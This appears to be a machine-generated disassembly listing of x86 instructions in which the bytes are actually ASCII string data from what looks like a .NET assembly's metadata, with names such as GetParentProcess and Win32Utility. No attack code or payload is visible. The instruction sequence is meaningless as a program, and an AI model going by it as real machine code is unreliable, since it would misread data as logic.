  402dd4:	gs jb  0x402e4a
  402dd7:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  402dde:	push   esp
  402ddf:	popa   
  402de0:	jb     0x402e49
  402de2:	gs je  0x402e2b
  402de5:	jb     0x402e48
  402de7:	ins    DWORD PTR es:[edi],dx
  402de8:	gs ja  0x402e5a
  402deb:	jb     0x402e58
  402ded:	inc    ecx
  402dee:	je     0x402e64
  402df0:	jb     0x402e5b
  402df2:	bound  esi,QWORD PTR [ebp+0x74]
  402df5:	add    BYTE PTR gs:[ebx+0x79],dl
  402df9:	jae    0x402e6f
  402dfb:	gs ins DWORD PTR es:[edi],dx
  402dfd:	cs push edx
  402dff:	jne    0x402e6f
  402e01:	je     0x402e6c
  402e03:	ins    DWORD PTR es:[edi],dx
  402e04:	gs cs dec ecx
  402e07:	outs   dx,BYTE PTR ds:[esi]
  402e08:	je     0x402e6f
  402e0a:	jb     0x402e7b
  402e0c:	jo     0x402e61
  402e0e:	gs jb  0x402e87
  402e11:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  402e18:	ins    DWORD PTR es:[edi],dx
  402e19:	push   esi
  402e1a:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  402e21:	je     0x402e97
  402e23:	jb     0x402e8e
  402e25:	bound  esi,QWORD PTR [ebp+0x74]
  402e28:	add    BYTE PTR gs:[ebx+0x4c],al
  402e2c:	push   ebx
  402e2d:	inc    ebx
  402e2e:	outs   dx,DWORD PTR ds:[esi]
  402e2f:	ins    DWORD PTR es:[edi],dx
  402e30:	jo     0x402e9e
  402e32:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  402e39:	jb     0x402ea4
  402e3b:	bound  esi,QWORD PTR [ebp+0x74]
  402e3e:	add    BYTE PTR gs:[ebx+0x79],dl
  402e42:	jae    0x402eb8
  402e44:	gs ins DWORD PTR es:[edi],dx
  402e46:	cs push edx
  402e48:	gs data16 ins BYTE PTR es:[edi],dx
  402e4b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402e50:	outs   dx,BYTE PTR ds:[esi]
  402e51:	add    BYTE PTR [ecx+0x73],al
  402e54:	jae    0x402ebb
  402e56:	ins    DWORD PTR es:[edi],dx
  402e57:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  402e5b:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  402e63:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402e6a:	jae    0x402edf
  402e6c:	gs ins DWORD PTR es:[edi],dx
  402e6e:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402e72:	gs jae 0x402ed8
  402e75:	jb     0x402ee0
  402e77:	jo     0x402eed
  402e79:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402e80:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402e87:	jae    0x402efc
  402e89:	gs ins DWORD PTR es:[edi],dx
  402e8b:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402e8f:	gs popaw 
  402e92:	jne    0x402f00
  402e94:	je     0x402ed7
  402e96:	ins    BYTE PTR es:[edi],dx
  402e97:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  402e9e:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402ea5:	jae    0x402f1a
  402ea7:	gs ins DWORD PTR es:[edi],dx
  402ea9:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402ead:	outs   dx,DWORD PTR ds:[esi]
  402eae:	ins    DWORD PTR es:[edi],dx
  402eaf:	jo     0x402f12
  402eb1:	outs   dx,BYTE PTR ds:[esi]
  402eb2:	jns    0x402ef5
  402eb4:	je     0x402f2a
  402eb6:	jb     0x402f21
  402eb8:	bound  esi,QWORD PTR [ebp+0x74]
  402ebb:	add    BYTE PTR gs:[ecx+0x73],al
  402ebf:	jae    0x402f26
  402ec1:	ins    DWORD PTR es:[edi],dx
  402ec2:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402ec6:	jb     0x402f37
  402ec8:	fs jne 0x402f2e
  402ecb:	je     0x402f0e
  402ecd:	je     0x402f43
  402ecf:	jb     0x402f3a
  402ed1:	bound  esi,QWORD PTR [ebp+0x74]
  402ed4:	add    BYTE PTR gs:[ecx+0x73],al
  402ed8:	jae    0x402f3f
  402eda:	ins    DWORD PTR es:[edi],dx
  402edb:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402edf:	outs   dx,DWORD PTR ds:[esi]
  402ee0:	jo     0x402f5b
  402ee2:	jb     0x402f4d
  402ee4:	addr16 push 0x74744174
  402eea:	jb     0x402f55
  402eec:	bound  esi,QWORD PTR [ebp+0x74]
  402eef:	add    BYTE PTR gs:[ecx+0x73],al
  402ef3:	jae    0x402f5a
  402ef5:	ins    DWORD PTR es:[edi],dx
  402ef6:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  402efa:	gs jb  0x402f70
  402efd:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402f04:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402f0b:	jae    0x402f80
  402f0d:	gs ins DWORD PTR es:[edi],dx
  402f0f:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402f13:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  402f1b:	outs   dx,DWORD PTR ds:[esi]
  402f1c:	outs   dx,BYTE PTR ds:[esi]
  402f1d:	inc    ecx
  402f1e:	je     0x402f94
  402f20:	jb     0x402f8b
  402f22:	bound  esi,QWORD PTR [ebp+0x74]
  402f25:	add    BYTE PTR gs:[ecx+0x73],al
  402f29:	jae    0x402f90
  402f2b:	ins    DWORD PTR es:[edi],dx
  402f2c:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  402f30:	outs   dx,BYTE PTR ds:[esi]
  402f31:	outs   dx,WORD PTR ds:[esi]
  402f33:	jb     0x402fa2
  402f35:	popa   
  402f36:	je     0x402fa1
  402f38:	outs   dx,DWORD PTR ds:[esi]
  402f39:	outs   dx,BYTE PTR ds:[esi]
  402f3a:	popa   
  402f3b:	ins    BYTE PTR es:[edi],dx
  402f3c:	push   esi
  402f3d:	gs jb  0x402fb3
  402f40:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402f47:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  402f4e:	popa   
  402f4f:	je     0x402fb6
  402f51:	ins    BYTE PTR es:[edi],dx
  402f52:	ins    BYTE PTR es:[edi],dx
  402f53:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  402f5b:	popa   
  402f5c:	arpl   WORD PTR [esi+edx*2+0x65],si
  402f60:	jb     0x402fd5
  402f62:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402f69:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  402f70:	gs jne 0x402fe7
  402f73:	jb     0x402fd6
  402f75:	ins    BYTE PTR es:[edi],dx
  402f76:	push   edx
  402f77:	gs jae 0x402fe9
  402f7a:	jne    0x402fee
  402f7c:	arpl   WORD PTR [ebp+0x73],sp
  402f7f:	dec    esp
  402f80:	popa   
  402f81:	outs   dx,BYTE PTR ds:[esi]
  402f82:	addr16 jne 0x402fe6
  402f85:	addr16 gs inc ecx
  402f88:	je     0x402ffe
  402f8a:	jb     0x402ff5
  402f8c:	bound  esi,QWORD PTR [ebp+0x74]
  402f8f:	add    BYTE PTR gs:[ecx+0x73],al
  402f93:	jae    0x402ffa
  402f95:	ins    DWORD PTR es:[edi],dx
  402f96:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402f9a:	gs ins BYTE PTR es:[edi],dx
  402f9c:	popa   
  402f9d:	jns    0x402ff2
  402f9f:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  402fa6:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402fad:	jae    0x403022
  402faf:	gs ins DWORD PTR es:[edi],dx
  402fb1:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  402fb5:	gs jns 0x402ffe
  402fb8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  402fc0:	bound  esi,QWORD PTR [ebp+0x74]
  402fc3:	add    BYTE PTR gs:[ecx+0x73],al
  402fc7:	jae    0x40302e
  402fc9:	ins    DWORD PTR es:[edi],dx
  402fca:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  402fce:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  402fd5:	gs dec ebx
  402fd7:	gs jns 0x40301b
  402fda:	je     0x403050
  402fdc:	jb     0x403047
  402fde:	bound  esi,QWORD PTR [ebp+0x74]
  402fe1:	add    BYTE PTR gs:[ebx+0x79],dl
  402fe5:	jae    0x40305b
  402fe7:	gs ins DWORD PTR es:[edi],dx
  402fe9:	cs push edx
  402feb:	jne    0x40305b
  402fed:	je     0x403058
  402fef:	ins    DWORD PTR es:[edi],dx
  402ff0:	gs cs inc ebx
  402ff3:	outs   dx,DWORD PTR ds:[esi]
  402ff4:	ins    DWORD PTR es:[edi],dx
  402ff5:	jo     0x403060
  402ff7:	ins    BYTE PTR es:[edi],dx
  402ff8:	gs jb  0x40304e
  402ffb:	gs jb  0x403074
  402ffe:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  403005:	outs   dx,BYTE PTR ds:[esi]
  403006:	je     0x403071
  403008:	ins    DWORD PTR es:[edi],dx
  403009:	gs inc ebx
  40300b:	outs   dx,DWORD PTR ds:[esi]
  40300c:	ins    DWORD PTR es:[edi],dx
  40300d:	jo     0x403070
  40300f:	je     0x40307a
  403011:	bound  ebp,QWORD PTR [ecx+0x6c]
  403014:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  40301c:	bound  esi,QWORD PTR [ebp+0x74]
  40301f:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  403024:	jne    0x40308d
  403026:	addr16 popa 
  403028:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40302c:	je     0x4030a2
  40302e:	jb     0x403099
  403030:	bound  esi,QWORD PTR [ebp+0x74]
  403033:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  403038:	jne    0x4030a1
  40303a:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  403042:	jae    0x403044
  403044:	inc    ebx
  403045:	outs   dx,DWORD PTR ds:[esi]
  403046:	ins    DWORD PTR es:[edi],dx
  403047:	jo     0x4030b2
  403049:	ins    BYTE PTR es:[edi],dx
  40304a:	popa   
  40304b:	je     0x4030b6
  40304d:	outs   dx,DWORD PTR ds:[esi]
  40304e:	outs   dx,BYTE PTR ds:[esi]
  40304f:	push   edx
  403050:	gs ins BYTE PTR es:[edi],dx
  403052:	popa   
  403053:	js     0x4030b6
  403055:	je     0x4030c0
  403057:	outs   dx,DWORD PTR ds:[esi]
  403058:	outs   dx,BYTE PTR ds:[esi]
  403059:	jae    0x40309c
  40305b:	je     0x4030d1
  40305d:	jb     0x4030c8
  40305f:	bound  esi,QWORD PTR [ebp+0x74]
  403062:	add    BYTE PTR gs:[ebx+0x65],dh
  403066:	je     0x4030c7
  403068:	push   ebx
  403069:	outs   dx,DWORD PTR ds:[esi]
  40306a:	jne    0x4030de
  40306c:	arpl   WORD PTR [ebp+0x0],sp
  40306f:	inc    ebp
  403070:	outs   dx,BYTE PTR ds:[esi]
  403071:	jbe    0x4030dc
  403073:	jb     0x4030e4
  403075:	outs   dx,BYTE PTR ds:[esi]
  403076:	ins    DWORD PTR es:[edi],dx
  403077:	outs   dx,BYTE PTR gs:[esi]
  403079:	je     0x40307b
  40307b:	addr16 gs je 0x4030de
  40307f:	inc    ebx
  403080:	outs   dx,DWORD PTR ds:[esi]
  403081:	ins    DWORD PTR es:[edi],dx
  403082:	ins    DWORD PTR es:[edi],dx
  403083:	popa   
  403084:	outs   dx,BYTE PTR ds:[esi]
  403085:	fs dec esp
  403087:	imul   ebp,DWORD PTR [esi+0x65],0x73795300
  40308e:	je     0x4030f5
  403090:	ins    DWORD PTR es:[edi],dx
  403091:	cs push esp
  403093:	gs js  0x40310a
  403096:	cs push edx
  403098:	gs addr16 jne 0x403108
  40309c:	popa   
  40309d:	jb     0x4030e4
  40309f:	js     0x403111
  4030a1:	jb     0x403108
  4030a3:	jae    0x403118
  4030a5:	imul   ebp,DWORD PTR [edi+0x6e],0x65520073
  4030ac:	addr16 gs js 0x4030b0
  4030b0:	dec    ebp
  4030b1:	popa   
  4030b2:	je     0x403117
  4030b4:	push   0x6f724700
  4030b9:	jne    0x40312b
  4030bb:	add    BYTE PTR [edi+0x65],ah
  4030be:	je     0x40311f
  4030c0:	push   ebx
  4030c1:	jne    0x403126
  4030c3:	arpl   WORD PTR [ebp+0x73],sp
  4030c6:	jae    0x4030c8
  4030c8:	inc    edi
  4030c9:	jb     0x40313a
  4030cb:	jne    0x40313d
  4030cd:	inc    ebx
  4030ce:	outs   dx,DWORD PTR ds:[esi]
  4030cf:	ins    BYTE PTR es:[edi],dx
  4030d0:	ins    BYTE PTR es:[edi],dx
  4030d1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4030d6:	outs   dx,BYTE PTR ds:[esi]
  4030d7:	add    BYTE PTR [edi+0x65],ah
  4030da:	je     0x40313b
  4030dc:	inc    edi
  4030dd:	jb     0x40314e
  4030df:	jne    0x403151
  4030e1:	jae    0x4030e3
  4030e3:	addr16 gs je 0x403146
  4030e7:	inc    ebx
  4030e8:	outs   dx,DWORD PTR ds:[esi]
  4030e9:	jne    0x403159
  4030eb:	je     0x4030ed
  4030ed:	addr16 gs je 0x403150
  4030f1:	dec    ecx
  4030f2:	je     0x403159
  4030f4:	ins    DWORD PTR es:[edi],dx
  4030f5:	add    BYTE PTR [ebx+0x61],al
  4030f8:	jo     0x40316e
  4030fa:	jne    0x40316e
  4030fc:	add    BYTE PTR gs:[edi+0x65],ah
  403100:	je     0x403161
  403102:	push   esi
  403103:	popa   
  403104:	ins    BYTE PTR es:[edi],dx
  403105:	jne    0x40316c
  403107:	add    BYTE PTR [ebx+0x68],al
  40310a:	popa   
  40310b:	jb     0x40310d
  40310d:	push   ebx
  40310e:	je     0x403182
  403110:	imul   ebp,DWORD PTR [esi+0x67],0x69725400
  403117:	ins    DWORD PTR es:[edi],dx
  403118:	add    BYTE PTR [ebp+0x69],cl
  40311b:	arpl   WORD PTR [edx+0x6f],si
  40311e:	jae    0x40318f
  403120:	data16 je 0x403151
  403123:	push   esi
  403124:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40312b:	jne    0x403191
  40312d:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e45
  403134:	jb     0x4031a6
  403136:	jb     0x4031a1
  403138:	jae    0x40319f
  40313a:	cs inc ecx
  40313c:	jae    0x4031ae
  40313e:	dec    esi
  40313f:	gs je  0x40318a
  403142:	gs ins BYTE PTR es:[edi],dx
  403144:	jo     0x4031ab
  403146:	jb     0x403148
  403148:	dec    ebp
  403149:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403150:	je     0x403180
  403152:	push   esi
  403153:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40315a:	jne    0x4031c0
  40315c:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e45
  403163:	jb     0x4031d5
  403165:	jb     0x4031d0
  403167:	jae    0x4031ce
  403169:	cs inc ebx
  40316b:	outs   dx,DWORD PTR ds:[esi]
  40316c:	ins    DWORD PTR es:[edi],dx
  40316d:	ins    DWORD PTR es:[edi],dx
  40316e:	outs   dx,DWORD PTR ds:[esi]
  40316f:	outs   dx,BYTE PTR ds:[esi]
  403170:	add    BYTE PTR [ecx+0x49],cl
  403173:	push   ebx
  403174:	push   edx
  403175:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x68437972
  40317e:	arpl   WORD PTR gs:[ebx+0x65],bp
  403182:	jb     0x403184
  403184:	dec    ecx
  403185:	dec    ecx
  403186:	push   ebx
  403187:	inc    ebx
  403188:	outs   dx,DWORD PTR ds:[esi]
  403189:	ins    DWORD PTR es:[edi],dx
  40318a:	jo     0x4031fb
  40318c:	outs   dx,BYTE PTR ds:[esi]
  40318d:	outs   dx,BYTE PTR gs:[esi]
  40318f:	je     0x4031e3
  403191:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x654b7972
  40319a:	jns    0x4031e2
  40319c:	ins    BYTE PTR es:[edi],dx
  40319d:	popa   
  40319e:	addr16 jae 0x4031a1
  4031a1:	push   edx
  4031a2:	gs jno 0x40321a
  4031a5:	imul   esi,DWORD PTR [edx+0x65],0x53494964
  4031ac:	inc    ebx
  4031ad:	outs   dx,DWORD PTR ds:[esi]
  4031ae:	ins    DWORD PTR es:[edi],dx
  4031af:	jo     0x403220
  4031b1:	outs   dx,BYTE PTR ds:[esi]
  4031b2:	outs   dx,BYTE PTR gs:[esi]
  4031b4:	je     0x403229
  4031b6:	dec    esi
  4031b7:	outs   dx,DWORD PTR ds:[esi]
  4031b8:	je     0x403203
  4031ba:	outs   dx,BYTE PTR ds:[esi]
  4031bb:	jae    0x403231
  4031bd:	popa   
  4031be:	ins    BYTE PTR es:[edi],dx
  4031bf:	ins    BYTE PTR es:[edi],dx
  4031c0:	gs add BYTE PTR fs:[ebp+0x69],cl
  4031c5:	arpl   WORD PTR [edx+0x6f],si
  4031c8:	jae    0x403239
  4031ca:	data16 je 0x4031fb
  4031cd:	dec    ecx
  4031ce:	outs   dx,BYTE PTR ds:[esi]
  4031cf:	je     0x403236
  4031d1:	ins    BYTE PTR es:[edi],dx
  4031d2:	ins    BYTE PTR es:[edi],dx
  4031d3:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x312e6563
  4031db:	xor    DWORD PTR [esi],ebp
  4031dd:	xor    BYTE PTR [esi],ch
  4031df:	xor    BYTE PTR [eax],al
  4031e1:	dec    ebp
  4031e2:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4031e9:	je     0x403219
  4031eb:	push   esi
  4031ec:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4031f3:	jne    0x403259
  4031f5:	imul   ebp,DWORD PTR [edi+0x2e],0x67616944
  4031fc:	outs   dx,BYTE PTR ds:[esi]
  4031fd:	outs   dx,DWORD PTR ds:[esi]
  4031fe:	jae    0x403274
  403200:	imul   esp,DWORD PTR [ebx+0x73],0x6d6f432e
  403207:	ins    DWORD PTR es:[edi],dx
  403208:	outs   dx,DWORD PTR ds:[esi]
  403209:	outs   dx,BYTE PTR ds:[esi]
  40320a:	add    BYTE PTR [ebx+0x74],dl
  40320d:	jb     0x403278
  40320f:	outs   dx,BYTE PTR ds:[esi]
  403210:	addr16 push ebp
  403212:	je     0x40327d
  403214:	ins    BYTE PTR es:[edi],dx
  403215:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x726f4643
  40321d:	ins    DWORD PTR es:[edi],dx
  40321e:	popa   
  40321f:	je     0x403221
  403221:	addr16 gs je 0x403284
  403225:	dec    ecx
  403226:	dec    ecx
  403227:	push   ebx
  403228:	dec    ebp
  403229:	popa   
  40322a:	push   0x6f
  40322c:	jb     0x403284
  40322e:	gs jb  0x4032a4
  403231:	imul   ebp,DWORD PTR [edi+0x6e],0x6f725000
  403238:	arpl   WORD PTR [ebp+0x73],sp
  40323b:	jae    0x40323d
  40323d:	inc    edi
  40323e:	gs je  0x403284
  403241:	jne    0x4032b5
  403243:	jb     0x4032aa
  403245:	outs   dx,BYTE PTR ds:[esi]
  403246:	je     0x403298
  403248:	jb     0x4032b9
  40324a:	arpl   WORD PTR [ebp+0x73],sp
  40324d:	jae    0x40324f
  40324f:	push   edi
  403250:	imul   ebp,DWORD PTR [esi+0x33],0x69745532
  403257:	ins    BYTE PTR es:[edi],dx
  403258:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x50746547
  403260:	popa   
  403261:	jb     0x4032c8
  403263:	outs   dx,BYTE PTR ds:[esi]
  403264:	je     0x4032b6
  403266:	jb     0x4032d7
  403268:	arpl   WORD PTR [ebp+0x73],sp
  40326b:	jae    0x40326d
  40326d:	imul   ebp,DWORD PTR [ecx+0x73],0x6f736572
  403274:	ins    BYTE PTR es:[edi],dx
  403275:	jbe    0x4032dc
  403277:	jb     0x403279
  403279:	dec    ebp
  40327a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403281:	je     0x4032b1
  403283:	push   esi
  403284:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40328b:	jne    0x4032f1
  40328d:	imul   ebp,DWORD PTR [edi+0x2e],0x75626544
  403294:	addr16 addr16 gs jb 0x403299
  403299:	dec    ecx
  40329a:	dec    ecx
  40329b:	push   ebx
  40329c:	push   edx
  40329d:	gs jae 0x40330f
  4032a0:	ins    BYTE PTR es:[edi],dx
  4032a1:	jbe    0x403308
  4032a3:	jb     0x4032a5
  4032a5:	dec    ecx
  4032a6:	dec    ecx
  4032a7:	push   ebx
  4032a8:	dec    eax
  4032a9:	gs ins BYTE PTR es:[edi],dx
  4032ab:	jo     0x403312
  4032ad:	jb     0x4032af
  4032af:	inc    edi
  4032b0:	gs je  0x4032f7
  4032b3:	outs   dx,BYTE PTR ds:[esi]
  4032b4:	jae    0x403308
  4032b6:	gs jae 0x403328
  4032b9:	ins    BYTE PTR es:[edi],dx
  4032ba:	jne    0x403330
  4032bc:	imul   ebp,DWORD PTR [edi+0x6e],0x69727453
  4032c3:	outs   dx,BYTE PTR ds:[esi]
  4032c4:	add    BYTE PTR [bp+si+0x65],dl
  4032c8:	jae    0x403339
  4032ca:	ins    BYTE PTR es:[edi],dx
  4032cb:	jbe    0x403332
  4032cd:	push   ebp
  4032ce:	jb     0x40333c
  4032d0:	push   esp
  4032d1:	outs   dx,DWORD PTR ds:[esi]
  4032d2:	inc    ecx
  4032d3:	jo     0x403345
  4032d5:	push   eax
  4032d6:	outs   dx,DWORD PTR ds:[esi]
  4032d7:	outs   dx,DWORD PTR ds:[esi]
  4032d8:	ins    BYTE PTR es:[edi],dx
  4032d9:	dec    esi
  4032da:	popa   
  4032db:	ins    DWORD PTR es:[edi],dx
  4032dc:	add    BYTE PTR gs:[eax+0x72],dl
  4032e0:	outs   dx,DWORD PTR ds:[esi]
  4032e1:	arpl   WORD PTR [ebp+0x73],sp
  4032e4:	jae    0x40333d
  4032e6:	popa   
  4032e7:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  4032ef:	add    BYTE PTR [ebp+0x69],cl
  4032f2:	arpl   WORD PTR [edx+0x6f],si
  4032f5:	jae    0x403366
  4032f7:	data16 je 0x403328
  4032fa:	push   esi
  4032fb:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403302:	jne    0x403368
  403304:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e45
  40330b:	jb     0x40337d
  40330d:	jb     0x403378
  40330f:	jae    0x403376
  403311:	cs push edi
  403313:	bound  ecx,QWORD PTR gs:[ecx+0x6e]
  403317:	jae    0x40338d
  403319:	jb     0x403390
  40331b:	ins    DWORD PTR es:[edi],dx
  40331c:	outs   dx,BYTE PTR gs:[esi]
  40331e:	je     0x403320
  403320:	push   esp
  403321:	jb     0x403384
  403323:	arpl   WORD PTR [ebp+0x44],sp
  403326:	bound  esi,QWORD PTR gs:[ebp+0x67]
  40332a:	addr16 gs jb 0x403373
  40332e:	outs   dx,BYTE PTR ds:[esi]
  40332f:	jbe    0x40339a
  403331:	jb     0x4033a2
  403333:	outs   dx,BYTE PTR ds:[esi]
  403334:	ins    DWORD PTR es:[edi],dx
  403335:	outs   dx,BYTE PTR gs:[esi]
  403337:	je     0x40337c
  403339:	ins    BYTE PTR es:[edi],dx
  40333a:	gs popa 
  40333c:	outs   dx,BYTE PTR ds:[esi]
  40333d:	gs jb  0x403340
  403340:	push   ebx
  403341:	jns    0x4033b6
  403343:	je     0x4033aa
  403345:	ins    DWORD PTR es:[edi],dx
  403346:	cs push esp
  403348:	push   0x64616572
  40334d:	imul   ebp,DWORD PTR [esi+0x67],0x69615700
  403354:	je     0x40339e
  403356:	popa   
  403357:	outs   dx,BYTE PTR ds:[esi]
  403358:	fs ins BYTE PTR es:[edi],dx
  40335a:	add    BYTE PTR gs:[ebp+0x76],al
  40335e:	outs   dx,BYTE PTR gs:[esi]
  403360:	je     0x4033b9
  403362:	popa   
  403363:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  40336b:	add    BYTE PTR [edi+0x65],ah
  40336e:	je     0x4033cf
  403370:	dec    ecx
  403371:	dec    ecx
  403372:	push   ebx
  403373:	push   edi
  403374:	popa   
  403375:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  40337d:	add    BYTE PTR [edi+0x61],dl
  403380:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x6c430079
  403388:	gs popa 
  40338a:	outs   dx,BYTE PTR ds:[esi]
  40338b:	jne    0x4033fd
  40338d:	dec    ecx
  40338e:	dec    ecx
  40338f:	push   ebx
  403390:	inc    ebp
  403391:	outs   dx,BYTE PTR ds:[esi]
  403392:	jbe    0x4033fd
  403394:	jb     0x403405
  403396:	outs   dx,BYTE PTR ds:[esi]
  403397:	ins    DWORD PTR es:[edi],dx
  403398:	outs   dx,BYTE PTR gs:[esi]
  40339a:	je     0x40339c
  40339c:	inc    ebp
  40339d:	js     0x403402
  40339f:	gs jo  0x403416
  4033a2:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4033a9:	pop    edi
  4033aa:	dec    ebp
  4033ab:	gs jae 0x403421
  4033ae:	popa   
  4033af:	add    BYTE PTR gs:[si+0x69],al
  4033b4:	jae    0x403426
  4033b6:	outs   dx,DWORD PTR ds:[esi]
  4033b7:	jae    0x40341e
  4033b9:	add    BYTE PTR [ecx+0x44],cl
  4033bc:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  4033c3:	ins    BYTE PTR es:[edi],dx
  4033c4:	add    BYTE PTR gs:[eax+0x72],dl
  4033c8:	outs   dx,DWORD PTR ds:[esi]
  4033c9:	arpl   WORD PTR [ebp+0x73],sp
  4033cc:	jae    0x40341b
  4033ce:	outs   dx,DWORD PTR ds:[esi]
  4033cf:	fs jne 0x40343e
  4033d2:	add    BYTE PTR gs:[edi+0x65],ah
  4033d6:	je     0x403437
  4033d8:	dec    ebp
  4033d9:	popa   
  4033da:	imul   ebp,DWORD PTR [esi+0x4d],0x6c75646f
  4033e1:	add    BYTE PTR gs:[edi+0x65],ah
  4033e5:	je     0x403446
  4033e7:	inc    esi
  4033e8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  4033f0:	push   edi
  4033f1:	bound  ecx,QWORD PTR gs:[ecx+0x6e]
  4033f5:	jae    0x40346b
  4033f7:	jb     0x40346e
  4033f9:	ins    DWORD PTR es:[edi],dx
  4033fa:	outs   dx,BYTE PTR gs:[esi]
  4033fc:	je     0x403463
  4033fe:	jb     0x403445
  403400:	js     0x403465
  403402:	gs jo  0x403479
  403405:	imul   ebp,DWORD PTR [edi+0x6e],0x65764500
  40340c:	outs   dx,BYTE PTR ds:[esi]
  40340d:	je     0x40345b
  40340f:	outs   dx,DWORD PTR ds:[esi]
  403410:	addr16 inc ebp
  403412:	outs   dx,BYTE PTR ds:[esi]
  403413:	je     0x403487
  403415:	jns    0x40346b
  403417:	jns    0x403489
  403419:	add    BYTE PTR gs:[edi+0x72],dl
  40341d:	imul   esi,DWORD PTR [ebp+eiz*2+0x45],0x7972746e
  403425:	add    BYTE PTR [ebx+0x79],dl
  403428:	jae    0x40349e
  40342a:	gs ins DWORD PTR es:[edi],dx
  40342c:	cs push ebx
  40342e:	arpl   WORD PTR gs:[ebp+0x72],si
  403432:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x75636553
  40343a:	jb     0x4034a5
  40343c:	je     0x4034b7
  40343e:	inc    ebp
  40343f:	js     0x4034a4
  403441:	gs jo  0x4034b8
  403444:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  40344b:	je     0x4034b2
  40344d:	ins    DWORD PTR es:[edi],dx
  40344e:	cs inc ebx
  403450:	outs   dx,DWORD PTR ds:[esi]
  403451:	fs gs inc esp
  403454:	outs   dx,DWORD PTR ds:[esi]
  403455:	ins    DWORD PTR es:[edi],dx
  403456:	cs inc ebx
  403458:	outs   dx,DWORD PTR ds:[esi]
  403459:	ins    DWORD PTR es:[edi],dx
  40345a:	jo     0x4034c5
  40345c:	ins    BYTE PTR es:[edi],dx
  40345d:	gs jb  0x403460
  403460:	inc    edi
  403461:	outs   dx,BYTE PTR gs:[esi]
  403463:	gs jb  0x4034c7
  403466:	je     0x4034cd
  403468:	fs inc ebx
  40346a:	outs   dx,DWORD PTR ds:[esi]
  40346b:	fs gs inc ecx
  40346e:	je     0x4034e4
  403470:	jb     0x4034db
  403472:	bound  esi,QWORD PTR [ebp+0x74]
  403475:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40347a:	jne    0x4034e3
  40347c:	addr16 gs jb 0x4034ce
  403480:	outs   dx,DWORD PTR ds:[esi]
  403481:	outs   dx,BYTE PTR ds:[esi]
  403482:	push   ebp
  403483:	jae    0x4034ea
  403485:	jb     0x4034ca
  403487:	outs   dx,DWORD PTR ds:[esi]
  403488:	fs gs inc ecx
  40348b:	je     0x403501
  40348d:	jb     0x4034f8
  40348f:	bound  esi,QWORD PTR [ebp+0x74]
  403492:	add    BYTE PTR gs:[ebx+0x6f],al
  403496:	ins    DWORD PTR es:[edi],dx
  403497:	jo     0x403502
  403499:	ins    BYTE PTR es:[edi],dx
  40349a:	gs jb  0x4034e4
  40349d:	outs   dx,BYTE PTR gs:[esi]
  40349f:	gs jb  0x403503
  4034a2:	je     0x403509
  4034a4:	fs inc ecx
  4034a6:	je     0x40351c
